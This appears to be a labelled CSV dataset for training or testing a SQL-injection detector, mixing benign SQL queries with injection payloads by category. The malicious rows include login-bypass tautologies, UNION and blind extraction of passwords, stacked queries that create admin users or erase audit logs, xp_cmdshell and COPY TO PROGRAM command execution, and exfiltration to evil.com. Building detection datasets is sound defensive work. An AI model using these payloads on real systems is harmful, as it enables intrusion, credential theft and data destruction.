query,label,category,description
"SELECT * FROM users WHERE salary > (SELECT AVG(salary) FROM users);",0,subquery,"Comparison subquery"
"SELECT * FROM products WHERE EXISTS (SELECT 1 FROM inventory WHERE inventory.product_id = products.id AND quantity > 0);",0,subquery,"EXISTS subquery"
"SELECT (SELECT name FROM categories WHERE id = p.category_id) as cat_name, p.name FROM products p;",0,subquery,"Scalar subquery"
"SELECT * FROM users WHERE id = (SELECT MAX(id) FROM users);",0,subquery,"Max ID subquery"
"SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE vip = 1);",0,subquery,"VIP customers"
"1' OR '1'='1' --",1,tautology,"Space before comment"
"' OR '1'='1' /*",1,tautology,"Block comment end"
"') OR ('x'='x",1,tautology,"Parenthesis string"
"0' OR '0'='0",1,tautology,"Zero tautology"
"' OR 2>1--",1,tautology,"Greater than tautology"
"' OR 1<2--",1,tautology,"Less than tautology"
"' OR 1!=2--",1,tautology,"Not equal tautology"
"' OR NOT 1=2--",1,tautology,"NOT tautology"
"' OR true--",1,tautology,"Boolean true"
"' OR 1--",1,tautology,"Simple true"
"admin' OR '1'='1",1,tautology,"Admin bypass"
"administrator'--",1,tautology,"Administrator bypass"
"root'--",1,tautology,"Root bypass"
"' OR ''='",1,tautology,"Empty equality"
"' OR 'abc'='abc",1,tautology,"String equality"
"' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",1,union,"Ten column UNION"
"' UNION SELECT null,null,null,null,null,null,null,null--",1,union,"Eight nulls"
"' UNION SELECT id,username,password,email,null,null FROM users--",1,union,"User data extraction"
"' UNION SELECT * FROM mysql.user--",1,union,"MySQL users"
"' UNION SELECT * FROM pg_shadow--",1,union,"PostgreSQL passwords"
"' UNION SELECT * FROM all_users--",1,union,"Oracle users"
"' UNION SELECT * FROM sys.syslogins--",1,union,"MSSQL logins"
"' UNION SELECT table_name,column_name,data_type,null FROM information_schema.columns--",1,union,"Column enumeration"
"' UNION SELECT schema_name,null,null,null FROM information_schema.schemata--",1,union,"Schema enumeration"
"' UNION SELECT grantee,privilege_type,null,null FROM information_schema.user_privileges--",1,union,"Privilege enumeration"
"' UNION SELECT host,user,password FROM mysql.user--",1,union,"MySQL credentials"
"' UNION SELECT name,sql,null,null FROM sqlite_master--",1,union,"SQLite schema"
"' UNION SELECT @@hostname,@@version,user(),database()--",1,union,"Server info"
"' UNION SELECT LOAD_FILE('/etc/passwd'),null,null,null--",1,union,"File read UNION"
"'; INSERT INTO users (username,password,role) VALUES ('evil','password','admin')--",1,stacked,"Create admin"
"'; UPDATE users SET is_admin = 1 WHERE username = 'attacker'--",1,stacked,"Grant admin"
"'; DELETE FROM audit_log--",1,stacked,"Delete audit"
"'; DROP INDEX idx_users_email--",1,stacked,"Drop index"
"'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'password'--",1,stacked,"Grant privileges"
"'; REVOKE ALL PRIVILEGES ON *.* FROM 'legit_user'@'localhost'--",1,stacked,"Revoke privileges"
"'; CREATE USER 'backdoor' IDENTIFIED BY 'secret'--",1,stacked,"Create user"
"'; ALTER USER 'admin' IDENTIFIED BY 'hacked123'--",1,stacked,"Change password"
"'; RENAME TABLE users TO users_backup--",1,stacked,"Rename table"
"'; TRUNCATE audit_logs--",1,stacked,"Truncate audit"
"1; EXEC sp_addsrvrolemember 'hacker', 'sysadmin'--",1,stacked,"MSSQL sysadmin"
"'; EXEC sp_configure 'xp_cmdshell', 1--",1,stacked,"Enable cmdshell"
"' AND SLEEP(15)--",1,time_blind,"15 second sleep"
"' AND SLEEP(30)--",1,time_blind,"30 second sleep"
"' AND IF(1=1,SLEEP(10),0)--",1,time_blind,"Conditional 10s"
"' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(10),0)--",1,time_blind,"Version check sleep"
"' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--",1,time_blind,"User check sleep"
"' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",1,time_blind,"Table exists sleep"
"' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--",1,time_blind,"Password extraction"
"' OR IF(1=1,BENCHMARK(50000000,MD5('test')),0)--",1,time_blind,"High benchmark"
"'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",1,time_blind,"PostgreSQL CASE sleep"
"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',10)--",1,time_blind,"Oracle time delay"
"' AND 1=1 AND 'a'='a",1,boolean_blind,"Double AND true"
"' AND 1=2 AND 'a'='a",1,boolean_blind,"AND false"
"' AND (SELECT LENGTH(username) FROM users WHERE id=1)=5--",1,boolean_blind,"Length check"
"' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",1,boolean_blind,"First char check"
"' AND (SELECT COUNT(*) FROM information_schema.tables)>10--",1,boolean_blind,"Table count"
"' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users'--",1,boolean_blind,"Table name check"
"' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)='id'--",1,boolean_blind,"Column check"
"' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='users')>5--",1,boolean_blind,"Column count"
"' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users LIMIT 0,1),1,1))>64--",1,boolean_blind,"Complex extraction"
"' AND (SELECT 1)=1--",1,boolean_blind,"Simple subquery true"
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",1,error_based,"Database name error"
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",1,error_based,"User name error"
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",1,error_based,"Table name error"
"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--",1,error_based,"Password error"
"' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)--",1,error_based,"Complex error"
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_based,"Group by error"
"' AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT * FROM(SELECT @@version)a)b))--",1,error_based,"Geometry error"
"' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT user())a)b))--",1,error_based,"Polygon error"
"' AND LINESTRING((SELECT * FROM(SELECT * FROM(SELECT database())a)b))--",1,error_based,"Linestring error"
"' OR 1+1=2--",1,obfuscated_case,"Math expression"
"'oR'1'='1",1,obfuscated_case,"No spaces OR"
"'AnD 1=0 oR 1=1--",1,obfuscated_case,"Mixed AND OR"
"' union select null--",1,obfuscated_case,"Lowercase union"
"' UNION select null--",1,obfuscated_case,"Mixed case union"
"' UnIoN aLl SeLeCt NuLl--",1,obfuscated_case,"Alternating UNION ALL"
"'/**/oR/**/1=1--",1,obfuscated_comment,"Comment OR lowercase"
"'/**/UNION/**/ALL/**/SELECT/**/1,2,3--",1,obfuscated_comment,"Comment UNION ALL"
"'/*!00000OR*/1=1--",1,obfuscated_comment,"MySQL conditional"
"'/*!12345UNION*//*!12345SELECT*/1,2,3--",1,obfuscated_comment,"MySQL version UNION"
"'/**_**/OR/**_**/1=1--",1,obfuscated_comment,"Underscore comments"
"'+OR+'1'='1",1,obfuscated_concat,"Plus concat"
"'||'1'='1",1,obfuscated_concat,"Oracle concat OR"
"' OR CHAR(49)=CHAR(49)--",1,obfuscated_concat,"CHAR comparison"
"' OR 0x313d31--",1,obfuscated_encoded,"Hex comparison"
"' OR UNHEX('3d')=UNHEX('3d')--",1,obfuscated_encoded,"UNHEX comparison"
"'%20OR%20'1'='1",1,obfuscated_encoded,"URL space encoding"
"'%09OR%091=1--",1,obfuscated_encoded,"URL tab encoding"
"'%0aOR%0a1=1--",1,obfuscated_encoded,"URL newline encoding"
"'%00' OR '1'='1",1,obfuscated_encoded,"Null byte injection"
"' unicode OR 1=1--",1,obfuscated_encoded,"Unicode prefix"
"SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --'",1,full_injection_select,"Full login bypass"
"SELECT * FROM products WHERE id = -1 UNION SELECT 1,username,password,4 FROM users--",1,full_injection_select,"Full data extraction"
"SELECT * FROM users WHERE email = 'x' UNION ALL SELECT NULL,NULL,table_name,NULL FROM information_schema.tables--",1,full_injection_select,"Full schema extraction"
"SELECT * FROM orders WHERE id = 1 AND (SELECT COUNT(*) FROM users WHERE is_admin=1) > 0--",1,full_injection_select,"Full boolean check"
"SELECT * FROM products WHERE id = '1' AND SLEEP(5) AND '1'='1",1,full_injection_select,"Full time-based"
"INSERT INTO comments (user_id, text) VALUES (1, 'test'); DELETE FROM users; --');",1,full_injection_insert,"Insert with delete"
"INSERT INTO feedback (message) VALUES ('x'),(SELECT password FROM users)--');",1,full_injection_insert,"Insert subquery"
"UPDATE users SET email = 'x@x.com' WHERE id = 1 OR 1=1--",1,full_injection_update,"Update all users"
"UPDATE products SET price = 0 WHERE id = 1; DROP TABLE products--",1,full_injection_update,"Update drop"
"DELETE FROM products WHERE id = 1 OR id = id--",1,full_injection_delete,"Delete all"
"DELETE FROM orders WHERE 1=1; INSERT INTO users (admin) VALUES (1)--",1,full_injection_delete,"Delete insert"
"' UNION SELECT name,sql FROM sqlite_master--",1,advanced,"SQLite schema dump"
"' UNION SELECT group_concat(tbl_name),1 FROM sqlite_master WHERE type='table'--",1,advanced,"SQLite tables"
"' OR 1=1; ATTACH DATABASE '/tmp/evil.db' AS evil--",1,advanced,"SQLite attach"
"'; COPY (SELECT '') TO PROGRAM 'whoami'--",1,advanced,"PostgreSQL command"
"'; CREATE OR REPLACE FUNCTION shell(text) RETURNS text AS 'system($1)' LANGUAGE plperlu--",1,advanced,"PostgreSQL function shell"
"'; DO $$DECLARE r RECORD;BEGIN EXECUTE 'COPY (SELECT 1) TO PROGRAM ''id''';END$$--",1,advanced,"PostgreSQL DO block"
"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",1,advanced,"MSSQL convert error"
"'; EXEC master..xp_cmdshell 'powershell -c IEX(wget http://evil.com/shell.ps1)'--",1,advanced,"MSSQL powershell"
"'; EXEC master..xp_fileexist 'C:\Windows\win.ini'--",1,advanced,"MSSQL file check"
"'; SELECT * FROM OPENROWSET('SQLOLEDB','server=evil.com;uid=sa;pwd=password','SELECT 1')--",1,advanced,"MSSQL OPENROWSET"
"' OR UTL_HTTP.request('http://evil.com/'||(SELECT password FROM users WHERE rownum=1))--",1,advanced,"Oracle out-of-band"
"' AND DBMS_XMLQUERY.NEWCONTEXT('SELECT * FROM users')--",1,advanced,"Oracle XML injection"
"' UNION SELECT XMLType('<!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://evil.com/""> %xxe;]><foo></foo>') FROM dual--",1,advanced,"Oracle XXE"
"' AND '1'='1&password=anything",1,advanced,"Parameter pollution"
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(@@secure_file_priv)))--",1,advanced,"Check file privs"
"' UNION SELECT TO_BASE64(LOAD_FILE('/etc/passwd'))--",1,advanced,"Base64 file read"
"SELECT * FROM products WHERE {{user_input}};",0,placeholder,"Template placeholder"
"SELECT * FROM users WHERE role = %(role)s;",0,placeholder,"Python format placeholder"
"SELECT * FROM orders WHERE id = {0};",0,placeholder,"C# format placeholder"
"SELECT * FROM products WHERE id = @product_id;",0,placeholder,"MSSQL parameter"
"SELECT * FROM users WHERE id = $1;",0,placeholder,"PostgreSQL parameter"
"SELECT * FROM users WHERE email = :email AND status = :status;",0,placeholder,"Multiple named params"
"SELECT * FROM products WHERE price BETWEEN :min_price AND :max_price;",0,placeholder,"Range params"
"SELECT * FROM users WHERE TIMESTAMPDIFF(YEAR, birthday, CURDATE()) >= 18;",0,complex_benign,"Age calculation"
"SELECT * FROM products WHERE (price - discount_amount) * (1 + tax_rate) < 100;",0,complex_benign,"Complex expression"
"SELECT IFNULL(nickname, CONCAT(first_name, ' ', last_name)) AS display_name FROM users;",0,complex_benign,"IFNULL concat"
"SELECT *, CASE WHEN stock > 10 THEN 'In Stock' WHEN stock > 0 THEN 'Low Stock' ELSE 'Out of Stock' END AS availability FROM products;",0,complex_benign,"Multi-case expression"
"SELECT * FROM users WHERE email RLIKE '^[a-z]+@[a-z]+\\.[a-z]{2,}$';",0,complex_benign,"RLIKE pattern"
"SELECT INET_ATON('192.168.1.1');",0,complex_benign,"IP function"
"SELECT HEX('hello');",0,complex_benign,"HEX function"
"SELECT MD5('password');",0,complex_benign,"MD5 function"
"SELECT SHA2('data', 256);",0,complex_benign,"SHA function"
"SELECT JSON_EXTRACT(data, '$.user.name') FROM orders;",0,complex_benign,"JSON extract"
"SELECT * FROM users WHERE JSON_CONTAINS(permissions, '\"admin\"');",0,complex_benign,"JSON contains"
"WITH RECURSIVE category_tree AS (SELECT * FROM categories WHERE parent_id IS NULL UNION ALL SELECT c.* FROM categories c JOIN category_tree ct ON c.parent_id = ct.id) SELECT * FROM category_tree;",0,complex_benign,"Recursive CTE"
"SELECT *, ROW_NUMBER() OVER (PARTITION BY category_id ORDER BY price DESC) as rank FROM products;",0,complex_benign,"Window function"
"SELECT *, LAG(price) OVER (ORDER BY created_at) as prev_price FROM products;",0,complex_benign,"LAG function"
"SELECT *, SUM(total) OVER (ORDER BY created_at ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) as running_total FROM orders;",0,complex_benign,"Running total"
"SELECT * FROM products WHERE SOUNDEX(name) = SOUNDEX('phone');",0,complex_benign,"SOUNDEX search"
"SELECT * FROM users WHERE MATCH(bio) AGAINST('developer programmer' IN NATURAL LANGUAGE MODE);",0,complex_benign,"Full text natural"
"SELECT * FROM products FORCE INDEX (idx_category) WHERE category_id = 5;",0,complex_benign,"Force index"
"SELECT /*+ INDEX(users idx_email) */ * FROM users WHERE email = 'test@example.com';",0,complex_benign,"Index hint"
"LOCK TABLES users WRITE;",0,complex_benign,"Lock table"
"START TRANSACTION;",0,complex_benign,"Start transaction"
"COMMIT;",0,complex_benign,"Commit"
"ROLLBACK;",0,complex_benign,"Rollback"
"SET autocommit = 0;",0,complex_benign,"Disable autocommit"
"SET NAMES 'utf8mb4';",0,complex_benign,"Set charset"
"SET @var = 5;",0,complex_benign,"Set variable"
"SELECT @var;",0,complex_benign,"Select variable"
"PREPARE stmt FROM 'SELECT * FROM users WHERE id = ?';",0,complex_benign,"Prepare statement"
"EXECUTE stmt USING @user_id;",0,complex_benign,"Execute prepared"
"DEALLOCATE PREPARE stmt;",0,complex_benign,"Deallocate prepared"
"ANALYZE TABLE users;",0,complex_benign,"Analyze table"
"OPTIMIZE TABLE products;",0,complex_benign,"Optimize table"
"CHECK TABLE orders;",0,complex_benign,"Check table"
"REPAIR TABLE sessions;",0,complex_benign,"Repair table"
"FLUSH PRIVILEGES;",0,complex_benign,"Flush privileges"
"SHOW PROCESSLIST;",0,complex_benign,"Show processes"
"SHOW VARIABLES LIKE 'max_connections';",0,complex_benign,"Show variable"
"SHOW STATUS LIKE 'Threads%';",0,complex_benign,"Show status"
"SHOW INDEX FROM users;",0,complex_benign,"Show indexes"
"SHOW GRANTS FOR CURRENT_USER;",0,complex_benign,"Show grants"
